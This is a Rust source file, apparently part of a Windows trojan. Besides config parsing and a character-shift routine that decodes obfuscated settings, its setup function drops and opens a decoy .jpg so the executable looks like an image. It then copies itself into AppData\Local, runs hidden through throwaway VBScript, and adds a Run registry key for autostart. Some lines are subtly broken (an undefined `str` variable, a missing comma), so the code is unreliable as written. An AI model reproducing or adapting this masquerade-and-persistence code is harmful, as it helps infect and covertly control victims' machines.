use crate::constant::*;
use rand::Rng;
use std::str::FromStr;
use std::{collections::HashMap, error};

pub type ConfigMap = HashMap<String, String>;
pub type Result<T> = std::result::Result<T, Box<dyn error::Error>>;

pub trait ConfigManager<'a> {
  fn safe_get<T>(&self, key: &'a str, default_value: T) -> T
  where
    T: ToString + FromStr;
}

impl<'a> ConfigManager<'a> for ConfigMap {
  fn safe_get<T>(&self, key: &'a str, default_value: T) -> T
  where
    T: ToString + FromStr,
  {
    return self
      .get(key)
      .unwrap_or(&default_value.to_string())
      .parse::<T>()
      .unwrap_or(default_value);
  }
}

pub fn gen_random_byte() -> u8 {
  let mut rng = rand::thread_rng();
  rng.gen::<u8>()
}

pub fn decrypt(s: &str) -> String {
  let can_decrypt = !s
    .chars()
    .into_iter()
    .any(|c| (c as u8) < CONFIG_DECRYPT_CHAR_LEFT_SHIFT);

  if can_decrypt {
    return s
      .chars()
      .map(|c| (c as u8 - CONFIG_DECRYPT_CHAR_LEFT_SHIFT as u8) as char)
      .collect::<String>();
  } else {
    return s.into();
  }
}

pub fn parse_config(s: &str) -> ConfigMap {
  let parsed: ConfigMap = s
    .split(CONFIG_SEPARATOR)
    .map(|line: &str| line.split(CONFIG_PAIR_SEPARATOR).collect())
    .collect::<Vec<Vec<&str>>>()
    .iter()
    .fold(HashMap::<String, String>::new(), |mut conf, pair| {
      if pair.len() == 2 {
        conf.insert(pair[0].trim().to_string(), pair[1].trim().to_string());
      };
      return conf;
    });

  return parsed;
}

#[cfg(target_os = "windows")]
pub fn setup(name: &str) -> Result<()> {
  use std::{
    env, fs,
    process::{exit, Command},
  };
  let home_path = env::home_dir().unwrap().display().to_string();
  let current_path = std::env::current_exe().unwrap().display().to_string();
  let file_name = current_path.split("\\").last().unwrap();
  let target_path = home_path.clone() + format!("\\AppData\\Local\\{}.exe", str);
  let vbs_path = home_path.clone() + format!("\\AppData\\Local\\{}.vbs", str);
  let mut image_path = (home_path.clone() + "\\Pictures\\" + file_name).replace(".exe", "");

  if !image_path.ends_with(".jpg") {
    image_path.push_str(".jpg");
  }

  if current_path == target_path {
    return Ok(());
  }

  // Copy image and open
  {
    fs::write(&image_path, PLACEHOLDER_BUF)?;
    let vbs_content = format!(
      r#"
      Set oShell = CreateObject("Wscript.Shell")
      oShell.Run "cmd /c {}", 0, false
    "#,
      image_path
    );
    fs::write(&vbs_path, &vbs_content)?;
    Command::new("wscript").arg(&vbs_path).output()?;
    fs::remove_file(&vbs_path)?;

    fs::copy(&current_path, &target_path)?;
  }

  // Run add and register as autorun
  {
    let vbs_content = format!(
      r#"
      Set oShell = CreateObject("Wscript.Shell")
      oShell.Run "cmd /c {target_path}", 0, false
      oShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\{name}","{target_path}","REG_SZ"
    "#,
      name = name
      target_path = target_path
    );
    fs::write(&vbs_path, &vbs_content)?;
    Command::new("wscript").arg(&vbs_path).output()?;
    fs::remove_file(&vbs_path)?;
  }

  exit(0);
}

#[cfg(not(target_os = "windows"))]
pub fn setup(_: &str) -> Result<()> {
  Ok(())
}
